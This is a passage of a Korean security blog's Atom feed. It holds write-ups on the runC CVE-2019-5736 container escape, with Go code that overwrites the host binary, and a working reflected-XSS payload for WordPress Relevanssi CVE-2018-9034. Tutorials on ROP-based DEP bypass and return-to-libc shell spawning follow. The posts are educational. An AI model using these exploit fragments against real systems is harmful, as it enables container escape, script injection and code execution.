		writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) &amp;gt; 0 {
			fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;다음 코드에서는 위에서 찾아낸 runC의 PID값을 이용해 파일 핸들을 얻어냅니다. 이 핸들을 이용해 &lt;strong&gt;/proc/self/fd/파일 서술자&lt;/strong&gt;의 &lt;strong&gt;파일 핸들&lt;/strong&gt;을 얻습니다. 해당 파일 핸들을 유지하며 Host의 runC를 악성 runC로 바꾸는 등의 권한을 얻게 됩니다.&lt;/p&gt;

&lt;p&gt;위에서의 과정에서 보이듯 &lt;strong&gt;rudC&lt;/strong&gt;의 &lt;strong&gt;파일 서술자(/proc/self/exe)&lt;/strong&gt;에 대한 처리 미흡으로 권한 상승이 가능해지는 취약점입니다.&lt;/p&gt;

&lt;h1 id=&quot;대응-방법&quot;&gt;대응 방법&lt;/h1&gt;

&lt;p&gt;취약점의 동작 조건중 하나는 &lt;strong&gt;Container&lt;/strong&gt;에의 &lt;strong&gt;root&lt;/strong&gt;권한이 있어야 합니다. 또한 &lt;strong&gt;출처를 알 수 없는 이미지&lt;/strong&gt;를 무분별하게 사용시에도 공격 시나리오가 생길것입니다. 
전부는 아니지만 대부분의 Cloud Container system이 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 취약할 것 입니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Container root 권한 제한&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;신뢰할 수 없는 이미지 파일 사용 자제&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;runC 등 최신 버전 유지&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;컨테이너 시작 시 호출되는 바이너리의 임시 백업 바이너리 생성&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;…….&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;해당 취약점에 영향을 받는 여러 업체들(Red Hat, runC 관리자, google, Amazon, Docker, debian, ubuntn 등등)은 취약 runC 버전에 대해서 업데이트 한 이미지를 배포중입니다.&lt;/p&gt;

&lt;p&gt;영어 해석에 재능이 부족하여 틀린 내용이 있다면 알려주시기 바랍니다 :)&lt;/p&gt;

&lt;p&gt;감사합니다.&lt;/p&gt;

&lt;h2 id=&quot;references-참고-문헌&quot;&gt;References 참고 문헌&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html&lt;/li&gt;
  &lt;li&gt;https://brauner.github.io/2019/02/12/privileged-containers.html&lt;/li&gt;
  &lt;li&gt;https://www.helpnetsecurity.com/2019/02/12/runc-container-escape-flaw/&lt;/li&gt;
  &lt;li&gt;https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/&lt;/li&gt;
  &lt;li&gt;https://vulmon.com/exploitdetails?qidtp=EDB&amp;amp;qid=46369&lt;/li&gt;
  &lt;li&gt;https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d&lt;/li&gt;
  &lt;li&gt;https://github.com/rancher/runc-cve&lt;/li&gt;
  &lt;li&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/li&gt;
  &lt;li&gt;https://subicura.com/2017/01/19/docker-guide-for-beginners-1.html&lt;/li&gt;
&lt;/ul&gt;</content>

      
      
      
      
      

      <author>
          <name>Sulla</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">CVE-2019-5736 (runC Container 취약점)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">web-0x03</title>
      <link href="/web-0x03" rel="alternate" type="text/html" title="web-0x03" />
      <published>2019-03-25T14:00:00+09:00</published>
      <updated>2019-03-25T14:00:00+09:00</updated>
      <id>/web-0x03</id>
      <content type="html" xml:base="/web-0x03">&lt;h1 id=&quot;cve-2018-9034-1day-test&quot;&gt;CVE-2018-9034 1Day Test&lt;/h1&gt;

&lt;p&gt;안녕하세요 hackyu입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Wordpress 환경에서의 검색 기능을 제공하는 Relevanssi Search Plugin 4.0.4 이전버전(Version 4.0.4 포함)에서 발생한 CVE-2018-9034 XSS(Cross Site Scripting - Reflected) 취약점에 대한 포스팅입니다.&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;취약점-분석&quot;&gt;취약점 분석&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;환경구성&lt;/strong&gt;&lt;br /&gt;
    &lt;ul&gt;
      &lt;li&gt;Apache 2.4.18&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;PHP 7.0.30&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Wordpress 4.9.4&lt;br /&gt;&lt;/li&gt;
      &lt;li&gt;Wordpress Relevanssi Search Plugin 4.0.4&lt;br /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_1.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - CVE-2018-9034 Flow -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;다음은 취약점이 발생한 Relevanssi Search Plugin lib/interface.php를 확인해보면, tab 파라미터에 스크립트를 삽입하여 요청하는 경우 취약점이 발생이 가능한 것을 확인할 수 있습니다.&lt;br /&gt;&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_2.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - relevanssi.php -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_3.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - interface.php -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;취약점-공격-테스트&quot;&gt;취약점 공격 테스트&lt;/h5&gt;
&lt;p&gt;제일 기본적으로 스크립트가 정상적으로 구동이 되는지
&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert('TEST');&amp;lt;/script&amp;gt;&lt;/code&gt;를 tab 파라미터로 요청한 결과로 스크립트가 구동되지 않고, 기본적으로 스크립트에 사용될 수 있는 ‘, “ 등 Escape 문자인 경우 ‘'가 붙어 응답되어 스크립트가 정상적으로 구동되지 않았고, 스크립트 삽입 시 Escape문자를 사용할 수 없는 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_4.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - XSS 구문 삽입 테스트 Escape문자로 인해 실행되지 않음 -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Escape 문자를 사용할 수 없는 경우 다음과 그림과 같이 Javascript의 substring(), String()를 이용하여 ‘/’(인덱스 start, end)를 제외한 문자열을 다시 변수 x에 대입하여 원하는 문자열을 이용하여 스크립트를 사용할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_5.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - Javascript 테스트 -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;공격 시 사용되는 tab 파라미터를 통한 Payload는 다음과 같습니다.&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nx&quot;&gt;Server&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wordpress&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;general&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relevanssi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relevanssi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;gt;&amp;lt;script&amp;gt;var x = String(/hackyu CVE-2018-9034 TEST/);x = x.substring(1, x.length-1);alert(x)&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;위의 Payload를 이용하여 다음과 같이 정상적으로 스크립트가 실행되는 것을 확인할 수 있습니다.&lt;/p&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_6.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - XSS 시도 및 결과  -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;패치 및 대응방안&lt;/strong&gt;
&lt;br /&gt;
-Update to version
&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x03_7.png&quot; /&gt;
  &lt;figcaption&gt;&lt;center&gt;  
   - Relevanssi Version 4.0.4(좌), 4.0.5(우) -
  &lt;/center&gt;&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;References&lt;/strong&gt;
&lt;br /&gt;
https://www.exploit-db.com/exploits/44366&lt;br /&gt;
https://ppbuz.com/8644&lt;br /&gt;
https://nvd.nist.gov/vuln/detail/CVE-2018-9034&lt;br /&gt;
https://pluginarchive.com/wordpress/relevanssi/v/4-0-4&lt;br /&gt;
https://downloads.wordpress.org/plugin/relevanssi.4.0.4.zip&lt;/li&gt;
&lt;/ul&gt;</content>

      
      
      
      
      

      <author>
          <name>Hackyu</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">CVE-2018-9034 1Day Test</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x09</title>
      <link href="/windows-0x09" rel="alternate" type="text/html" title="windows-0x09" />
      <published>2019-03-24T20:18:00+09:00</published>
      <updated>2019-03-24T20:18:00+09:00</updated>
      <id>/windows-0x09</id>
      <content type="html" xml:base="/windows-0x09">&lt;h1 id=&quot;0x09-dep3&quot;&gt;0x09 DEP(3)&lt;/h1&gt;

&lt;p&gt;이번 시간에는 DEP의 마지막 주제인 ROP에 대해서 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;rop-return-oriented-programming&quot;&gt;ROP (Return Oriented Programming)&lt;/h5&gt;

&lt;p&gt;ROP는 Gadget으로 Chain을 구성하여 API를 호출하는 방식의 공격 기법입니다.&lt;/p&gt;

&lt;p&gt;주로 VirtualProtect()나 SetProcessDEPPolicy() 등 메모리와 관련된 함수들을 호출하며,&lt;/p&gt;

&lt;p&gt;Shellcode를 실행할 수 있도록 실행 권한을 추가하는 방향으로 진행됩니다.&lt;/p&gt;

&lt;p&gt;이번 연재에서는 가장 흔하고 쉬운 방식인 VirtualProtect() API를 호출해서 DEP를 우회하도록 하겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;virtualprotect-함수&quot;&gt;VirtualProtect 함수&lt;/h6&gt;

&lt;p&gt;VirtualProtect는 4개의 인자를 가지며, 특정 메모리 영역의 실행 권한을 변경해주는 함수입니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BOOL WINAPI VirtualProtect (
		_In_ LPVOID lpAddress, 		 # 권한을 변경할 메모리 영역의 시작 주소
		_In_ SIZE_T dwSize,	   		 # 변경할 크기
		_In_ flNewProtect,     		 # 변경할 속성 값
		_Out_ PDWORD lpflOldProtect, # 이전 값 저장 (쓰기 가능한 영역)
	);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;VirtualProtect 함수는 변경을 원하는 메모리 영역의 시작 주소를 기준으로 원하는 크기만큼 실행 권한을 변경해줍니다.&lt;/p&gt;

&lt;p&gt;그럼 ShellCode를 넣어둔 뒤, 그 크기만큼 실행 권한을 주면 되겠네요.&lt;/p&gt;

&lt;p&gt;이 내용을 STACK으로 구성하면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그림처럼 STACK을 구성할 경우, VirtualProtect()가 호출되어 ShellCode가 들어있는 메모리 주소에 실행 권한이 생길 것이고,&lt;/p&gt;

&lt;p&gt;다음 RET에서 JMP ESP가 호출되어 ShellCode가 실행될 것 입니다.&lt;/p&gt;

&lt;p&gt;그리고 이 모양의 STACK을 구성하기 위해 PUSHAD 명령어를 이용할 것 입니다. STACK 구성이 좀 더 쉽겠죠?&lt;/p&gt;

&lt;h5 id=&quot;payload-구성&quot;&gt;PAYLOAD 구성&lt;/h5&gt;

&lt;p&gt;Mona.py를 이용해서 ROP Chain 구성에 사용할 Gadget들을 찾아 보겠습니다. ( !mona modules )&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Gadget은 위의 Module들 중에 ASLR이 적용되어 있지 않은 example.dll에서 가져다 쓰면 되겠네요.&lt;/p&gt;

&lt;p&gt;이제 여기서 Gadget을 구해서 값들을 맞춰주기만 하면 되는데,,, 일일이 하나씩 찾아서 넣으면 엄청나게 많은 시간이 소요되겠죠??&lt;/p&gt;

&lt;p&gt;하나하나 다 찾아다닐 시간은 없으니까 mona.py에서 제공하는 기능을 활용하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona rop -m example
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 명령어를 사용하면 mona.py에서 자동으로 rop 공격에 필요한 Gadget들을 example.dll에서 찾아 파일로 생성해줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;여러 언어에 맞게 추천을 해주는데 여러분 환경에 맞는 값을 사용하시면 됩니다.&lt;/p&gt;

&lt;p&gt;이제 필요한 Gadget들을 아주 손쉽게 찾아왔는데 한 가지 생각해야 할 점이 있습니다.&lt;/p&gt;

&lt;p&gt;바로 VirtualProtect의 함수 주소입니다.&lt;/p&gt;

&lt;p&gt;ASLR이 적용되어 있으면 Window API 함수들의 주소도 계속해서 변할텐데 어떻게 주소를 가지고 올 수 있는 걸까요?&lt;/p&gt;

&lt;p&gt;Gadget 파일을 잘 보시면 VirtualProtect에 IAT라고 적혀있는 것을 보실 수 있을 겁니다.&lt;/p&gt;

&lt;p&gt;IAT(Import Address Table)는 프로그램에서 사용되는 라이브러리에서 어떤 함수들을 사용하고 있는지, 그 함수들의 정보를 기술한 테이블입니다.&lt;/p&gt;

&lt;p&gt;아래와 같이 example.dll의 IAT를 살펴보면 우리가 사용하고자 하는 VirtualProtect() 함수의 정보가 들어있는 것을 확인하실 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이렇게 VirtualProtect() 정보가 들어 있는 경우에는 IAT 값에서 시작 주소를 가져다가 쓰면 되는 것이죠.&lt;/p&gt;

&lt;p&gt;없다면? 동적으로 찾아오도록 Gadget을 구성하면 됩니다.&lt;/p&gt;

&lt;h5 id=&quot;null-byte-제거&quot;&gt;Null Byte 제거&lt;/h5&gt;

&lt;p&gt;공격을 성공적으로 하기 위해 Payload에 존재하는 Null Byte들을 제거해줘야겠죠?&lt;/p&gt;

&lt;p&gt;mona가 만들어 준 값들엔 Null Byte가 존재해서 Payload 전달이 완전하게 이루어지지 않는답니다.&lt;/p&gt;

&lt;p&gt;그래서 다음과 같이 수정을 했습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저, 0x201, 0x40 같은 값을 넣어줘야 하는데 Null이 존재하므로 0xfffffdff, 0xffffffc0를 넣고 neg를 사용해서 값을 생성해줬습니다.&lt;/p&gt;

&lt;p&gt;그리고 Gadget 주소 중에 Null이 존재하는 것은 다른 Gadget 찾아서 교체해준 내용입니다.&lt;/p&gt;

&lt;p&gt;mona만 믿고 Payload를 구성하시면 안됩니다. 잘 살펴보고 Null은 반드시 제거해주셔야 합니다.&lt;/p&gt;

&lt;p&gt;이어서 DBG로 살펴보면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;strcpy가 실행되고 나서의 모습입니다. 각 Gadget들이 연속해서 실행된 뒤, VirtualProtect() 함수가 실행될 것이고,&lt;/p&gt;

&lt;p&gt;마지막에 JMP ESP가 실행되면서 ShellCode가 실행되겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;잘 실행되네요^^&lt;/p&gt;

&lt;p&gt;지금까지 DEP에 대해서 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 연재부터는 Heap Exploit으로 찾아뵙도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x09 DEP(3)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">linux_0x04</title>
      <link href="/linux_0x04" rel="alternate" type="text/html" title="linux_0x04" />
      <published>2019-03-24T15:18:00+09:00</published>
      <updated>2019-03-24T15:18:00+09:00</updated>
      <id>/linux_0x04</id>
      <content type="html" xml:base="/linux_0x04">&lt;h2 id=&quot;rtlreturn-to-library&quot;&gt;RTL(Return to Library)&lt;/h2&gt;

&lt;p&gt;안녕하세요. &lt;strong&gt;Sulla&lt;/strong&gt;입니다!&lt;/p&gt;

&lt;p&gt;이번에 알아볼 내용은 &lt;strong&gt;RTL&lt;/strong&gt;(Return to Library)입니다.
먼저 &lt;strong&gt;RTL&lt;/strong&gt;이 뭔지를 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h1 id=&quot;rtlreturn-to-library-1&quot;&gt;RTL(Return to Library)&lt;/h1&gt;

&lt;p&gt;지난 포스팅에서 &lt;strong&gt;메모리 보호 기법&lt;/strong&gt;에 대해 간단하게 봤습니다. 그 중 &lt;strong&gt;ASLR&lt;/strong&gt;은 봤고 &lt;strong&gt;DEP/NX bit&lt;/strong&gt;는 언급만 하고 넘어갔었죠. &lt;strong&gt;메모리 내부에서 코드실행을 방지&lt;/strong&gt;하기 위한 메모리 보호 기법 중 하나라고 알려 드렸습니다.&lt;/p&gt;

&lt;p&gt;메모리에서의 코드 실행이 막혔기 때문에(Shellcode 실행 차단) 다른 방법을 찾아야 합니다. &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 직접 실행할 수 있다면 가능할 듯 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-1.png&quot; alt=&quot;[그림 4-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그럼 어떻게 해야할까요? 첫 포스팅에서 메모리 구조를 설명 드릴 때 위 그림을 보여 드렸었습니다.&lt;strong&gt;[스택 -&lt;/strong&gt; &lt;strong&gt;공유라이브러리 -&lt;/strong&gt; &lt;strong&gt;힙 - BSS/Data - Code]&lt;/strong&gt;으로 이뤄지며, 공유 라이브러리는 &lt;strong&gt;메모리에 미리 필요한 중요 함수들을 저장해두는 장소&lt;/strong&gt;라고 간단하게 설명 드렸었죠.
저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;를 사용하여 &lt;strong&gt;/bin/sh&lt;/strong&gt;을 실행할 수 있지 않을까???라는 생각으로 &lt;strong&gt;RTL&lt;/strong&gt;이 연구되었다 생각되네요….(&lt;strong&gt;뇌피셜)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;공유 라이버르러리를 간단하게 정리하자면 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;여러 프로세스에서 동시에 사용 가능한 라이브러리&lt;/li&gt;
  &lt;li&gt;프로그램이 시작될 때 메모리에 적재됨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;우리는 저 &lt;strong&gt;공유 라이브러리&lt;/strong&gt; 중에서 &lt;strong&gt;system()&lt;/strong&gt; 함수를 사용하겠습니다. 해당 함수는 입력받은 문자열을 실행시키는 함수입니다. 즉, 인자값으로 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 입력한다면 &lt;strong&gt;system(“/bin/sh”);&lt;/strong&gt;과 같은 형태가 되며 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt;를 실행하게 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-2.png&quot; alt=&quot;[그림 4-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;RTL&lt;/strong&gt;의 흐름을 위와 같이 표현했습니다. &lt;strong&gt;libc&lt;/strong&gt;(공유라이브러리)의 함수(&lt;strong&gt;system()&lt;/strong&gt;)를 사용해서 &lt;strong&gt;8byte&lt;/strong&gt; 뒤에 &lt;strong&gt;/bin/sh&lt;/strong&gt; 의 주소를 박아두면 &lt;strong&gt;system()&lt;/strong&gt;이 &lt;strong&gt;/bin/sh&lt;/strong&gt; 를 실행하여 &lt;strong&gt;shell&lt;/strong&gt;을 따내게 됩니다. 
즉, &lt;strong&gt;버퍼 + sfp + system() + AAAA + /bin/sh&lt;/strong&gt; 처럼 표현 가능할 듯 합니다.&lt;/p&gt;

&lt;p&gt;여기서 왜 &lt;strong&gt;system()&lt;/strong&gt; 뒤에 인자값으로 바로 &lt;strong&gt;/bin/sh/&lt;/strong&gt;가 아닌 잉여값 “&lt;strong&gt;AAAA&lt;/strong&gt;“을 입력할까요? 그냥 바로 인자값을 입력하면 인식을 못할까요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-3.png&quot; alt=&quot;[그림 4-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;system(“/bin/sh”)&lt;/strong&gt; 이 입력된 상태에서 함수가 종료되면 에필로그 과정을 가집니다. 에필로그 과정 중 ret(pop eip) 과정을 거치며 system() 함수의 주소를 eip에  옮기게 되죠. 이 과정에 pop 명령을 사용 했기에 스택에 공간이 생깁니다.(가운데) 그런 다음 system() 함수의 프롤로그 과정을 가지며 push ebp, mov ebp, esp 과정을 거치며 새롭게 메모리의 영역을 확보하죠. 
즉, AAAA의 위치는 system 함수가 끝난 뒤의 ret 구역이 되며 잉여값을 배치해주고, 다음 공간에 원하는 주소값을 위치시켜 줍니다. 좀더 확실하게 알아보도록 하죠. (참고로 root로 생성된 실행파일은 디버깅이 안되니 /tmp/ 하위에 다른 폴더로 복사해서 분석해주세요!!)&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-4.png&quot; alt=&quot;[그림 4-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 사진에서와 같이 system() 내부를 들여다 보면 프로로그 과정을 거치고 EBP에서 8byte 떨어진 주소를 참조합니다. EBP에서 4byte를 가지고 우리는 남은 4byte만(RET) 채워준 뒤 원하는 주소를 입력해준다면 인자값을 정상적으로 인식하게 됩니다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Return to Library&lt;/strong&gt;라는 이름을 아주 성실하게 이행하는 모습이네요. 그럼 직접 시작해보곘습니다. 먼저 찾아야 할 주소는 아래와 같습니다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = ????&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1번 system 주소부터 확인 하도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x04/0x04-5.png&quot; alt=&quot;[그림 4-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저 브레이크를 main 함수에 잡아주고 구동 시킵니다.bp에 멈추고 나면 print 명령을 사용해 system()의 주소를 확인 하시면 됩니다.(system의 주소를 못 찾는 심볼을 찾을수 없다는 에러가 뜨는 경우 static 옵션을 뺴고 컴파일 해주세요….개고생 했습니다…..)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;system()&lt;/strong&gt; 주소 = &lt;strong&gt;0x4203f2c0&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;/bin/sh&lt;/strong&gt; 주소 = ????&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;이제 /bin/sh의 주소를 구해야 합니다. 실제로는 /lib/libc.so.6 라이브러리 파일 내의 /bin/sh와 system 의 오프셋을 구해서 최종적인 문자열 주소를 찾을수 있지만 아래의 반복문을 통해서 쉽게 구해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01 #include &amp;lt;stdio.h&amp;gt;
02 
03 int main(){
04   long shell=0x4203f2c0; //system()의 주소를 입력해 주시면 됩니다.
05 	 while(memcmp((void*)shell,(&quot;/bin/sh&quot;),8))
06   shell++; 
07 	 printf(&quot;%p\n&quot;,shell);
08 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;코드의 중요 라인인 5라인만 설명 드리자면 &lt;strong&gt;memcmp&lt;/strong&gt; 함수를 사용해서 &lt;strong&gt;바이트 데이터를 비교&lt;/strong&gt; 하는 과정입니다. &lt;strong&gt;memcmp(인자1, 인자2, 사이즈)&lt;/strong&gt;의 기본형을 가지며 &lt;strong&gt;인자 1&lt;/strong&gt;의 첫 바이트와 &lt;strong&gt;인자 2&lt;/strong&gt;의 첫 바이트를 &lt;strong&gt;사이즈&lt;/strong&gt; 만큼 비교하는 것이며, 이 과정을 통해서 &lt;strong&gt;system()내부에 /bin/sh 문자열을&lt;/strong&gt; 찾아내며 결과적으로 &lt;strong&gt;주소값으로 리턴&lt;/strong&gt; 해줍니다. 돌려줍시다~&lt;/p&gt;

&lt;figure&gt;
